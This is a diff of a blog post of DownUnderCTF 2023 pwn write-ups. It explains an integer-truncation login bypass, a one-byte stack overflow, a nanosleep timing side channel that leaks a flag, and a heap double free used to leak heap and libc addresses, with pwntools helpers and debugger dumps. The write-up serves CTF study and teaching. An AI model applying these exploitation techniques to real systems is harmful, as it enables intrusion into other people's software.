@@ -13,13 +13,48 @@ summary: "Downunderctf 2023 Writeups"
 featuredImage: "images/2023-09-03 18_59_11-DownUnderCTF 2023.png"
 ---
 
-Celebrate independence day with DownunderCTF. 
+Spent independence day with DownunderCTF. 
 
 Given files can be found at: 
 
 # [pwn/beginner 100] downunderflow
 
-We input index as an `int` but it will be cast into `unsigned short`, where the higher 2 bytes are ommited. Therefore, we want to input a negative int with 2 lower byte being `0007`, such as `0xffff0007`
+```c
+#define USERNAME_LEN 6
+#define NUM_USERS 8
+char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };
+
+void init() {
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stdin, 0, 2, 0);
+}
+
+int read_int_lower_than(int bound) {
+    int x;
+    scanf("%d", &x);
+    if(x >= bound) {
+        puts("Invalid input!");
+        exit(1);
+    }
+    return x;
+}
+
+int main() {
+    init();
+
+    printf("Select user to log in as: ");
+    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
+    printf("Logging in as %s\n", logins[idx]);
+    if(strncmp(logins[idx], "admin", 5) == 0) {
+        puts("Welcome admin.");
+        system("/bin/sh");
+    } else {
+        system("/bin/date");
+    }
+}
+```
+
+We need to enter 7 to win. The program takes input as `int` (4 bytes) but then casts it to `unsigned short` (2 bytes), omitting the higher 2 bytes. Therefore, we want to input a negative `int` with 2 lower bytes being `0007`, such as `0xffff0007`
 
 flag: `DUCTF{-65529_==_7_(mod_65536)}`
 
@@ -27,7 +62,7 @@ flag: `DUCTF{-65529_==_7_(mod_65536)}`
 
 The return procedure is as following. 
 
-```c
+```gdb
  ► 0x5656a28b <main+93>                    add    esp, 0x10
    0x5656a28e <main+96>                    mov    eax, 0
    0x5656a293 <main+101>                   lea    esp, [ebp - 8]
@@ -40,9 +75,9 @@ The return procedure is as following.
 
 `ecx` is poped from stack and used to calculate return address. Using the one-byte overflow we can control `ecx` and point return address to our buffer.
 
-For instance, with this stack, we can changed saved `ecx` from `0xff971a50` to `0xff971a24` to win. 
+For example, with this stack, we can changed saved `ecx` from `0xff971a50` to `0xff971a24` to win. 
 
-```c
+```gdb
 pwndbg> tel 0xff971a20	# buffer
 00:0000│ ecx 0xff971a20 —▸ 0x56627203 (win) ◂— push ebp
 01:0004│     0xff971a24 ◂— 0x61616161 ('aaaa')
@@ -52,7 +87,7 @@ pwndbg> tel 0xff971a20	# buffer
 06:0018│ ebp 0xff971a38 —▸ 0xf7fa3020 (_rtld_global) —▸ 0xf7fa3a40 —▸ 0x56626000 ◂— 0x464c457f
 ```
 
-Note that only the least sifnificant nibble in stack address is static, so we might have to run the solve script serveral times (~16 times).
+Note that only the least significant nibble in stack address is fixed, so we might have to run the solve script serveral times (~16 times).
 
 `solve.py`:
 
@@ -96,7 +131,7 @@ p.interactive()
 
 # [pwn/easy 166] great escape
 
-```c
+```sh
 $ seccomp-tools dump ./jail
 what is your escape plan?
  > cc
@@ -115,9 +150,9 @@ what is your escape plan?
  0010: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 
-The program executes our shellcode that limited to syscall `read`, `nanosleep`, `exit` and `openat`, and the challenge gives the path of the flag is at `/chal/flag.txt`.
+The program executes our shellcode that is limited to 4 syscalls `read`, `nanosleep`, `exit` and `openat`, and the challenge provides flag path: `/chal/flag.txt`.
 
-Knowing the absolute path, we can open flag with `openat` and `read` the content of it into memory. We can't print the flag normally, but we can make use of `nanosleep` to leak it the more bizarre way. In particular, we can pass each byte of the flag to `nanosleep`  as argument and count the timming to get the byte. 
+Knowing the absolute path, we can open flag with `openat` and `read` the content of it into memory. We can't print the flag normally, but we can make use of `nanosleep` to leak it the more bizarre way. In particular, we can pass each byte of the flag to `nanosleep`  as parameter and count the sleep time to get value. 
 
 ```c
 int nanosleep(const struct timespec *req,
@@ -135,7 +170,7 @@ int nanosleep(const struct timespec *req,
 
 `time_t` is alias of `long`, so the struct take `0x10` byte. 
 
-Actually using the whole byte as `tv_sec` is time consuming and may get timeout, so I use half a byte at a time. 
+Counting one byte at a time is time consumming, so I count half a byte at a time. 
 
 `solve.py:`
 
@@ -213,8 +248,7 @@ while (1):
 p.interactive()
 ```
 
-```c
-[ reduced ]
+```sh
 [+] Opening connection to 2023.ductf.dev on port 30010: Done
 [*] attempt 43
 [*] time: 13.240954875946045
@@ -231,47 +265,112 @@ p.interactive()
 [*] flag: DUCTF{S1de\x00Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}\x00 
 ```
 
-One character is failed but we can guess it :P
+There's one incorrect character but we can guess it :P
 
 flag: `DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}`
 
 # [pwn/hard 316] baby CRM
 
-CRM stands for Customer relationship management(?)
+```sh
+$ ./baby-crm
+1. New Customer
+2. Alter Customer
+3. Show Customer
+4. Help
+>
+```
 
 The program provides functions to add customers and add orders to a customer.
 
-Some suspicious point I found in the first code reading:
+Some suspicious points I found:
 
-1. `description` field in `Order` use `char` instead of string
+1. `Order`'s fields use `char` while `Customer`'s fields use `string`. 
+
+   ```cpp
+   class Order {
+     // ...
+     private:
+       char* description_;
+       double value_;
+   };
+   
+   class Customer {
+     // ..
+     private:
+       string name_;
+       float revenue_; 
+       string description_;
+       vector<Order*> * orders_;
+   }
+   ```
 2. `fill_buf()` doesn't terminate buf
-3. order editing in `alter_customer()` use [] operator instead of `at(idx)`
+3. order editing in `alter_customer()` use [] operator instead of `at(idx)` (no bound check)
 4. `show_customer()` doesn't have length check
+
+   ```cpp
+   void show_customer() {
+     Customer * customer;
+   
+     size_t choice;
+     cout << "Customer to show: " << endl;
+     cin >> choice;
+     customer = customers[choice];
+     customer->print();
+   }
+   ```
 5. `fwrite()` writes fixed `0x50` bytes instead of check buf's length
+
+   ```cpp
+   #define DESCRIPTION_SIZE 0x50
+   		void print_description() {
+         fwrite(description_, DESCRIPTION_SIZE, 1, stdout);
+       }
+   ```
 
 ## heap leak
 
 (4) seems promise for a heap leak, but in practice, it is barely possible to find a block of memory that fits `Customer` object frame. 
 
-After messing around with program's functions (by spamming each option) without any direction, I accidently got a double free `free(): double free detected in tcache 2` with this!
+After spamming each option, I accidently got a double free `free(): double free detected in tcache 2` with this!
 
 ```python
+def add_customer(name):
+    cmd(b'1')
+    arg(name)
+
+def edit_name(idx, name):
+    cmd(b'2')
+    arg(str(idx).encode())
+    cmd(b'1')
+    arg(name)
+        
+def add_order(idx, value, des):
+    cmd(b'2')
+    arg(str(idx).encode())
+    cmd(b'3')
+    payload = value + des
+    if len(des) == 0x50:
+        p.sendafter(b': ', payload)
+    else: 
+        p.sendlineafter(b': ', payload)
+
+def print_help(order=True):
+    cmd(b'4')
+    if order:
+        cmd(b'1')
+    else:
+        cmd(b'2')
+        
 for i in range(15):
     add_customer(b'\x00')
-# add_customer(b'\x00'*0x30)
-# add_customer(b'\x00'*0x10)
-# edit_name(0, b'\x00'*0x10)
-# edit_name(1, b'\x00'*0x20)
-# edit_name(2, b'\x00'*0x20)
 add_order(0, b'2.121995791e-314', b' '+b'x'*0x4f)
 add_order(0, b'4.2030e4', b' '+b'y'*0x4f)
-# edit_order(0, 0, b' '+b'c'*0x4f)
 for i in range(10):
     print_help(False)
 show(0)
 ```
 
-Double free is done by using `help()` twice after selecting a customer in `alter_customer()`. It turns out that in `alter_customer()`, `rbp-0x80` is occupied by a pointer to an allocated `Customer`, then in `help()`, that `rbp-0x80` is reused to inflate a local `Order`. 
+Double free is caused by using `help()` twice after selecting a customer in `alter_customer()`. It turns out that some values in stack frames are reused and not cleared. In `alter_customer()`, `rbp-0x80` is occupied by a pointer to an allocated `Customer`, then in `help()`, that `rbp-0x80` is reused to allocate a local `Order`. 
 
 ```c
 unsigned __int64 alter_customer(void)
@@ -281,11 +380,13 @@ unsigned __int64 alter_customer(void)
   Order *v12; // [rsp+28h] [rbp-78h]
   char v13[32]; // [rsp+30h] [rbp-70h] BYREF
 	// [...]
-  v11 = *(Customer **)std::vector<Customer *>::operator[](customers, v8);
+  v11 = *(Customer **)std::vector<Customer *>::operator[](customers, v8);	// v11 is a pointer to an allocated memory
 	// [...]
   return v15 - __readfsqword(0x28u);
 }
 ```
+
+Then when the program calls `~Order()`, it actually frees a `Customer` from previous stack frame, hence the double free. Moreover, freed customer is not removed from its vector `customers`.
 
 ```c
 unsigned __int64 help(void)
@@ -298,13 +399,11 @@ unsigned __int64 help(void)
   Customer::Customer((Customer *)v5);
   // [...]
   Customer::~Customer((Customer *)v5);
-  Order::~Order((Order *)v4);
+  Order::~Order((Order *)v4);	// v4, corresponding to the above v11, is free
 
   return v6 - __readfsqword(0x28u);
 }
 ```
-
-Then when it call `~Order()`, it actually frees a `Customer` from previous stack frame, hence the double free. Moreover, freed customer is not removed from its vector `customers`.
 
 ```c
 void __fastcall Order::~Order(void **this)
@@ -314,12 +413,12 @@ void __fastcall Order::~Order(void **this)
 }
 ```
 
-Note that `Customer` and order's `description` field both use same size of allocation at `0x50`. Therefore, after freeing a customer, we can allocate an order and fully control customer's fields.
+Note that `Customer` and `Order`'s `description` field both use same size of allocation at `0x50`. Therefore, after `free`ing a customer, we can allocate an `Order`and fully control `Customer`'s fields.
 
 {{< admonition title="gdb" open=false >}}
 Before allocating new order:
 
-```c 
+```gdb
 pwndbg> tel &customers
 00:0000│  0x55be7ef8d2e0 (customers) —▸ 0x55be7f3f2580 —▸ 0x55be7f3f1eb0 —▸ 0x55be7f3f1f80 ◂— 'aaaaaaaaaaaaaaaa'
 01:0008│  0x55be7ef8d2e8 (customers+8) —▸ 0x55be7f3f25d0 ◂— 0x0
@@ -333,7 +432,7 @@ pwndbg> tel 0x55be7f3f2580
 
 After freeing `customers[0]`:
 
-```c
+```gdb
 pwndbg> tel &customers
 00:0000│ rax rdi 0x55be7ef8d2e0 (customers) —▸ 0x55be7f3f2580 —▸ 0x55be7f3f1eb0 ◂— 0x55be7f3f1
 01:0008│         0x55be7ef8d2e8 (customers+8) —▸ 0x55be7f3f25d0 ◂— 0x0
@@ -347,7 +446,7 @@ pwndbg> tel 0x55be7f3f2580
 
 After adding new order:
 
-```c
+```gdb
 pwndbg> tel &customers
 00:0000│ rax rdi 0x55be7ef8d2e0 (customers) —▸ 0x55be7f3f2580 —▸ 0x55be7f3f1eb0 ◂— 'got you\n'
 01:0008│         0x55be7ef8d2e8 (customers+8) —▸ 0x55be7f3f25d0 ◂— 0x0
@@ -369,11 +468,11 @@ pwndbg> tel 0x55be7f3f1eb0
 ```
 {{< /admonition >}}
 
-Now because order's `print()` use `fwrite()` with fixed length `0x50`, we can print the new order to leak heap address.
+Now because order's print fucntion uses `fwrite()` with fixed length `0x50`, we can print the new order to leak heap address.
 
 ## leak libc
 
-Now suspect (1) (order's `description` use `char*` instead of `string`) comes into play. If order's `description` uses `string` too, I couldn't leak anything. The picture below illustrates `std::string` structure. `string`'s first field holds a pointer to the buffer, while second field (`+0x8`) is the buffer's length and third field (`+0x10`) is the capacity of allocated space. By tampering `string` structure, we can leak any value pointed by a heap address.
+Now evidence (1) (order's `description` use `char*` instead of `string`) comes into play. If order's `description` uses `string` too, I couldn't leak anything. The picture below illustrates `std::string` structure. `string`'s first field holds a pointer to the buffer, while second field (`+0x8`) is the buffer's length and third field (`+0x10`) is the capacity of allocated space. By tampering `string` structure, we can leak any value pointed by a heap address.
 
 ![image-20230905084914187](images/image-20230905084914187.png)
 
@@ -404,7 +503,7 @@ show(3)
 
 ## exploit script
 
-> Code is ugly but I'm lazy to refine.
+> Code is ugly
 
 ```python
 #!/usr/bin/env python3
@@ -571,7 +670,7 @@ p.interactive()
 
 # other challenges
 
-I could not solve durings the contest but I will do them later. 
+I could not solve durings the contest, but there are some notes during contest. 
 
 ## binary mail
 
@@ -633,14 +732,6 @@ pwndbg> tel 0x7ffeaa2daa00	# end(bucket)
 ```
 
 ![image-20230903192911711](images/image-20230903192911711.png)
-
-## confusing
-
-## shifty mem
-
-## return to monke
-
-## vrooom vroom 
 
 ## safe calculator
 
